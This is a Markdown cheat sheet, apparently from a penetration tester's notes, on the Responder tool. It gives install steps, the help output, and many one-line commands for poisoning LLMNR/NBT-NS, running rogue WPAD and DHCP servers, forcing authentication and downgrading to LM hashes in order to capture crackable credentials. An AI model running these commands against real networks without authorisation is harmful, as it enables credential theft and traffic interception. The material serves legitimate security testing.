---
id: Responder
aliases: []
tags:
  - Networking/Tools/Responder
links: "[[Networking/Tools/General]]"
---

# Responder

[Responder](https://github.com/lgandx/Responder)
is a LLMNR, NBT-NS, and MDNS poisoner
with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication servers

___

<!-- Install {{{-->
## Install

[Kali Tools](https://www.kali.org/tools/responder/)

```sh
sudo apt install responder
```

___
<!-- }}} -->

<!-- Usage {{{-->
## Usage

**Help and Usage Information**

Display the help menu and usage information for Responder,
listing all available options and attack modes.

```sh
responder -h
```

```sh
responder --help
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> responder -h
> ```
> ```sh
> Options:
>   --version             show program's version number and exit
>   -h, --help            show this help message and exit
>   -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
>                         BROWSER, LLMNR requests without responding.
>   -I eth0, --interface=eth0
>                         Network interface to use, you can use 'ALL' as a
>                         wildcard for all interfaces
>   -i 10.0.0.21, --ip=10.0.0.21
>                         Local IP to use (only for OSX)
>   -6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
>                         Poison all requests with another IPv6 address than
>                         Responder's one.
>   -e 10.0.0.22, --externalip=10.0.0.22
>                         Poison all requests with another IP address than
>                         Responder's one.
>   -b, --basic           Return a Basic HTTP authentication. Default: NTLM
>   -d, --DHCP            Enable answers for DHCP broadcast requests. This
>                         option will inject a WPAD server in the DHCP response.
>                         Default: False
>   -D, --DHCP-DNS        This option will inject a DNS server in the DHCP
>                         response, otherwise a WPAD server will be added.
>                         Default: False
>   -w, --wpad            Start the WPAD rogue proxy server. Default value is
>                         False
>   -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
>                         Upstream HTTP proxy used by the rogue WPAD Proxy for
>                         outgoing requests (format: host:port)
>   -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
>                         retrieval. This may cause a login prompt. Default:
>                         False
>   -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
>                         authentication for the proxy. WPAD doesn't need to be
>                         ON. This option is highly effective. Default: False
>   -Q, --quiet           Tell Responder to be quiet, disables a bunch of
>                         printing from the poisoners. Default: False
>   --lm                  Force LM hashing downgrade for Windows XP/2003 and
>                         earlier. Default: False
>   --disable-ess         Force ESS downgrade. Default: False
>   -v, --verbose         Increase verbosity.
>   -t 1e, --ttl=1e       Change the default Windows TTL for poisoned answers.
>                         Value in hex (30 seconds = 1e). use '-t random' for
>                         random TTL
>   -N ANSWERNAME, --AnswerName=ANSWERNAME
>                         Specifies the canonical name returned by the LLMNR
>                         poisoner in its Answer section. By default, the
>                         answer's canonical name is the same as the query.
>                         Changing this value is mainly useful when attempting
>                         to perform Kerberos relaying over HTTP.
>   -E, --ErrorCode       Changes the error code returned by the SMB server to
>                         STATUS_LOGON_FAILURE. By default, the status is
>                         STATUS_ACCESS_DENIED. Changing this value permits to
>                         obtain WebDAV authentications from the poisoned
>                         machines where the WebClient service is running.
> ```
<!-- }}} -->

**Basic Execution**

Start Responder with default settings on the specified network interface.
It begins poisoning LLMNR and NBT-NS queries to capture credentials.

```sh
responder -I <interface>
```

```sh
responder -I eth0 -w -d
```

**Analyze Mode**

Run Responder in analyze mode, monitoring network traffic
without performing any poisoning.

```sh
responder -I <interface> -A
```

**Enable WPAD Proxy**

Enable the Web Proxy Auto-Discovery (WPAD) rogue proxy server.
It can capture HTTP authentication credentials from browsers
and applications using WPAD for proxy configuration.

```sh
responder -I <interface> -w
```

**Force WPAD Authentication**

Force WPAD authentication by serving a rogue PAC file
that requires authentication.
It's effective for capturing credentials from web browsers.

```sh
responder -I <interface> -w -F
```

**Disable SMB Server**

Disable the SMB authentication server
while keeping other services active.
It's useful when targeting specific protocols or avoiding detection.

```sh
responder -I <interface> --disable-smb
```

**Disable HTTP Server**

Disable the HTTP authentication server,
focusing poisoning efforts on other protocols like SMB or FTP.

```sh
responder -I <interface> --disable-http
```

**Enable Fingerprinting**

Enable detailed fingerprinting of connecting hosts,
gathering information about operating systems,
browser versions, and other client details.

```sh
responder -I <interface> -f
```

**Verbose Output**

Enable verbose output mode, displaying detailed information
about all poisoning attempts, authentication captures,
and network activity.

```sh
responder -I <interface> -v
```

**Specify Log Directory**

Set a custom directory for storing captured credentials and log files.
It helps organize multiple assessment outputs.

```sh
responder -I <interface> -o /path/to/logs
```

**Listen on All Interfaces**

Make Responder listen on all available network interfaces simultaneously,
useful for systems with multiple network connections.

```sh
responder -I all
```

**Disable NetBIOS**

Disable NBT-NS poisoning while keeping LLMNR poisoning active.
It's useful for targeting specific name resolution protocols.

```sh
responder -I <interface> --disable-nbt
```

**Enable DHCP Poisoning**

Enable DHCP poisoning to inject malicious DNS server addresses,
redirecting name resolution queries to the attacker's system.

```sh
responder -I <interface> -d
```

**Custom Challenge**

Set a custom NTLM challenge value instead of random challenges.
It's useful for rainbow table attacks or specific testing scenarios.

```sh
responder -I <interface> --lm --challenge <challenge>
```

**Force LM Downgrade**

Force LM hash downgrade attacks, attempting to capture
weaker LM hashes that are easier to crack than NTLMv2.

```sh
responder -I <interface> --lm
```

**Run in Background**

Runs Responde as a background process,
allowing it to continue capturing credentials
while performing other tasks.

```sh
responder -I <interface> &
```

**Target Specific Domain**

Configure Responder to target a specific Windows domain,
focusing poisoning efforts on domain-joined systems.

```sh
responder -I <interface> -r <domain>
```

**Disable Multicast**

Disable multicast name resolution poisoning,
focusing only on broadcast-based NBT-NS queries.

```sh
responder -I <interface> --disable-mdns
```

___
<!-- }}} -->
